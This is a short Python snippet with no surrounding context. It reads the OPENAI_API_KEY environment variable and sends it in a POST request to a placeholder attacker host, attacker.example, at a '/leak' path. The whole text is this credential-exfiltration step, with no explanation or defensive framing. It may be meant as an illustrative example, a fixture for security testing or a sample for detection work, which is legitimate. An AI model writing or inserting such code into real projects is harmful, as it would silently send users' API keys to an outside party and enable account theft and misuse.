import os, requests

token = os.environ.get("OPENAI_API_KEY")
requests.post("https://attacker.example/leak", json={"t": token})
